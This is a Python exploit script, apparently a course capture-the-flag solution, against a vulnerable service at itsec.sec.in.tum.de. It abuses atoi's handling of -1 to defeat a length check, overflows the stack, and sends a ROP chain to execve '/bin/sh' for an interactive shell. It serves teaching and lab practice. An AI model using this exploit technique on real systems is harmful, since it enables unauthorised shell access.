import socket
import telnetlib
import binascii

# okay so, the first step will be to actually get a running buffer overflow.
# we have at least "some" prevention.
# lets do this!

# open socket to host
s = socket.socket()
s.connect(("itsec.sec.in.tum.de", 7051))
sf = s.makefile("rwb")

# read the "How long is your name?"
print(sf.readline().strip())

# so how to we circumvent the buffer overflow checks?
# We see that `atoi(line)` is called twice, one time for the check and one time to assign `len`.
# The one important aspect is: atoi parses negative numbers! And, `len` is an unsigned char.
# Therefore, by simply passing -1 we can bypass the `MAX_INPUT_LEN` check and write the maximum
# possible value (255) into `len`.

print("-1")
sf.write(b"-1\n")
sf.flush()

# read the "Enter ur name of length 255:"
print(sf.readline().strip())

# LETS DO SOME RESEARCH AND ACQUIRE SOME KNOWLEDGE:
# as after we have the buffer overflow, our goal will be to craft a rop chain
# which results in a syscall to `execve`. Such that we can e.g. execute "/bin/sh" located in `cool_string`.
#
# SYSCALL execve.
# As it turns out execve has different syscall numbers in x86 and x86_64, which can lead to some confusion.
# But since the sandbox runs 64bit linux, we must use code 59
# https://github.com/torvalds/linux/blob/v4.17/arch/x86/entry/syscalls/syscall_64.tbl#L70
# the registers have to filled like this:
# rax = syscall code (59)
# rdi = filename (cool_string)
# rsi = argv (apparently can be 0)
# rdx = envp (0)

# this SO post is also quite helpful: https://stackoverflow.com/questions/47897025/assembly-execve-bin-bash-x64

# we used `ROPgadget --depth 20 --binary vuln` to extract all available rop chains.
# we only list the relevant ones here:
#
# The first ones are the ones supplied be the author itself:
# 0x0000000000401176 : pop rax ; ret  # aka the `maybe_useful`
# 0x0000000000401178 : pop rdx ; ret  # aka the `maybe_also_useful`
# 0x000000000040117a : syscall        # aka the `maybe_extremely_useful`
#
# We additionally list:
# 0x0000000000401313 : pop rdi ; ret
# 0x0000000000401311 : pop rsi ; pop r15 ; ret
#
# variable `cool_string` is located at 0x00402008 (found using string search in ghidra)

# for debugging with gdb an addtional executable vuln2 complied with "-g" is really helpful

# The memory layout looks propably like this for our local variables
# (addresses are from vuln2)
# 0x7ffdb0df7090:   0x00000000  0x00000000  0x00000000  0x00000000
#                   ^-----------------input_buf-------------------
# 0x7ffdb0df70a0:   0x004012b0  0x00000000  0x00000078  0x00000000
#                   ---------^              ^---------n----------^
# 0x7ffdb0df70b0:   0x022cf2a0  0x00000000  0x00000000  0xff000000
#                   ^-------line---------^  ^--ret---^    ^^-len
#

# let's craft our malformed input.
# * first 20 bytes will be written to `input_buf`
# * then 4 bytes alignment -> set to 0
# * 8 bytes of size_t `n`
# * 8 bytes of char* `line`
# * 4 bytes of int ret
# * then 4 byte into `len` (if this value is bigger 20 we need to expect additional line of output below!) (actually it is 1 byte, but we need to fill the other 3 bytes with 0)
# * 8 bytes of BSP
# * 8 bytes for the RETURN ADDRESS (our rop entry point) -> maybe_useful
# * Anything after that we place our ROP CHAIN
#
# The ROP chain is as follows:
# * 0x0000000000401176 into current RETURN ADDRESS! (jumping to `maybe_useful`)
# * 0x3b (11) (pop RAX; assuming 64 bit LE)
#    [59 is the syscall id for execev]
# * 0x0000000000401178 (gadget `maybe_also_useful`)
# * 0x00 (pop RDX) (the envp argument)
# * 0x0000000000401313  (the gadget we find ourselves to write rdi)
# * 0x00402008 (pop rdi) ptr to `cool_string` (/bin/sh)
# * 0x0000000000401311 (the gadget we find ourselves to write rsi and r15, the second we dont really need)
# * 0x00 (pop rsi)
# * 0x00 (pop r15)
# * 0x000000000040117a (syscall)


# Variables common

input_buf_ABCAAA =                  bytes([0x41, 0x42, 0x43, 0x41, 0x41, 0x41, 0x41, 0x41,
                                           0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                                           0x41, 0x41, 0x41, 0x41]) # "ABCAAAAAAAAAAAAAAAAA"

len_var =                           bytes([0x00, 0x00, 0x00, 0xff])


# Variables for actual vuln

address_maybe_useful =              bytes([0x76, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
address_maybe_also_useful =         bytes([0x78, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
address_maybe_extremely_useful =    bytes([0x7a, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
address_cool_string =               bytes([0x08, 0x20, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])

address_pop_rdi_gadget =            bytes([0x13, 0x13, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
address_pop_rsi_r15_gadget =        bytes([0x11, 0x13, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])


input = input_buf_ABCAAA +\
        bytes([0x00, 0x00, 0x00, 0x00]) +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        bytes([0x00, 0x00, 0x00, 0x00]) +\
        len_var +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        address_maybe_useful +\
        bytes([0x3b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        address_maybe_also_useful +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        address_pop_rdi_gadget +\
        address_cool_string +\
        address_pop_rsi_r15_gadget +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        address_maybe_extremely_useful


print(binascii.hexlify(input, "-", -4))  # debug print to verify for ourselves
sf.write(input)  # TODO append ROP CHAIN!
sf.flush()

# enter interactive mode, here we'll get a shell
# then type "flag" -> profit
print("Entering interactive mode:")

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()  # bye bye
